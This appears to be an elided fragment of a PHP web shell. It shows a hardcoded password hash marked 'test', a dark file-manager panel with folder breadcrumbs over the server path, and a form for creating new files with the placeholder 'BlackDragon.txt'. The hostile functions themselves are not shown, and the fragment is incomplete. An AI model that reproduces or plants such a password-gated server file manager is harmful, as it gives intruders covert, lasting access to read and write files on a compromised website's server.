...
$password = "60c9ee371869132ef70b061eac60c2aa"; // test
		...
		<div class="py-3" id="main">
			<div class="box shadow bg-dark p-4 rounded-3">
				...
				<div class="breadcrumb">
					<i class="fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : 
						if ($pat == '' && $id == 0):
					?>
						...
						<div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
							<form action="" method="post">
								<div class="mb-3">
									...
									<input type="text" class="form-control" name="newFileName" placeholder="BlackDragon.txt">
								</div>
								<div class="mb-3">
